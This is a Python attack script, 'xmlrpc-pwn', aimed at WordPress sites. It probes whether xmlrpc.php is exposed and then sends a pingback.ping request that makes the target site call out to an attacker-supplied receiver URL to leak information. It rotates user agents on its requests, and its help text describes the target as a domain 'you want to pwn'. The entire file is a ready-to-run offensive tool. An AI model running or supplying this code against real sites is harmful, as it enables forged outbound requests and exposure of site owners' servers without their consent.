#!/usr/bin/env python3
import urllib3
import re
from urllib.parse import urlsplit
import argparse
from random import choice

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_base_url(url: str) -> str:
    if not url.startswith('http'):
        url = f"https://{url}"

    return "{0.scheme}://{0.netloc}/".format(urlsplit(url))


def xmlrpc_demo_sayHello() -> str:
    return """<?xml version="1.0" encoding="utf-8"?> 
    <methodCall> 
    <methodName>demo.sayHello</methodName> 
    <params></params> 
    </methodCall>"""


def xmlrpc_demo_addTwoNumbers(number1: int = 1, number2: int = 1) -> str:
    return f"""<?xml version="1.0" encoding="utf-8"?> 
    <methodCall> 
    <methodName>demo.addTwoNumbers</methodName> 
    <params><value>{number1}</value><value>{number2}</value></params> 
    </methodCall>"""


def xmlrpc_pingback(target: str, receiver: str):
    body = f"""<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params>
    <param>
    <value><string>{receiver}</string></value>
    </param>
    <param>
    <value><string>{target}</string></value>
    </param>
    </params>
    </methodCall>"""

    response = send_xmlrpc_post_request(target, body)

    if response.status in [200, 201]:
        print("[+] Pingback request made succesfully")
    else:
        print(
            "[-] Something went wrong on the pingback request (HTTP STATUS: {response.status})")


def send_xmlrpc_post_request(url: str, body: str):
    url = f"{get_base_url(url)}xmlrpc.php"
    http = urllib3.PoolManager(num_pools=2)

    return http.request('POST', url, body=body, headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        "Accept": 'application/xml, text/xml',
        "User-Agent": random_user_agent()})


def random_user_agent() -> str:
    return choice(["Presto/2.12.388 Version/12.11",
                   "Presto/2.9.176 Version/11.00",
                   "Presto/2.7.62 Version/11.01 IABrowser36864557ba0",
                   "Presto/2.12.388 Version/12.15",
                   "Presto/2.5.24 Version/10.53",
                   "X11; Linux x86_64; kok-IN Presto/2.9.189 Version/11.00"
                   ])


def check_xmlrpc_is_open(url: str):
    url = url if url.endswith('xmlrpc.php') else f"{url}/xmlrpc.php"
    http = urllib3.PoolManager(num_pools=2)

    print(f"[+] Checking url {url} is open via GET request...")

    response = http.request('GET', url)

    if response.status == 405 and response.data == b'XML-RPC server accepts POST requests only.':
        return True
    else:
        print(
            f"[+] Trying alternative with POST request...")

        response = send_xmlrpc_post_request(url, xmlrpc_demo_sayHello())

        return response.status in [200, 201] and re.search('hello!', response.data.decode('utf-8'),  re.IGNORECASE)


def is_valid_hostname(url: str) -> bool:
    hostname = url if not url.startswith(
        'http') else "{0.netloc}".format(urlsplit(url))

    if hostname[-1] == ".":
        # strip exactly one dot from the right, if present
        hostname = hostname[:-1]
    if len(hostname) > 253:
        return False

    labels = hostname.split(".")

    # the TLD must be not all-numeric
    if re.match(r"[0-9]+$", labels[-1]):
        return False

    allowed = re.compile(r"(?!-)[a-z0-9-]{1,63}(?<!-)$", re.IGNORECASE)
    return all(allowed.match(label) for label in labels)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='''
Interact with xmlrpc.php file on wordpress site
EXAMPLES:
        xmlrpc-pwn -d example.com 
        xmlprc-pwn --domain example.com --pingback https://receiver.com:8080
        xmlrc-pwn -d example.es --check-only
''', formatter_class=argparse.RawDescriptionHelpFormatter, epilog='Wordpress is weak, insecure and ugly')

    parser.add_argument('-d', '--domain', type=str,
                        help="The target domain you want to pwn")
    parser.add_argument('-p', '--pingback', type=str,
                        help="Use a pingback attack to retrieve information from the target to your receiver")
    parser.add_argument('-c', '--check-only', required=False, action='store_true',
                        help="Just run a simple check to confirm it is open")
    parser.add_argument('-v', '--version', action='version',
                        version='%(prog)s 1.0')

    args = parser.parse_args()

    if args.domain and is_valid_hostname(args.domain):
        target = get_base_url(args.domain)

        if check_xmlrpc_is_open(target):
            print(f"[+] Site {target} has open the xmlrpc.php file")

            if not args.check_only:
                if args.pingback:
                    print(f"[+] Send pingback from {target} to your postbin")
                    xmlrpc_pingback(target, get_base_url(args.pingback))
        else:
            print(
                "[-] This site does not seems to have xmlrpc.php available to interact with")
    else:
        parser.print_help()
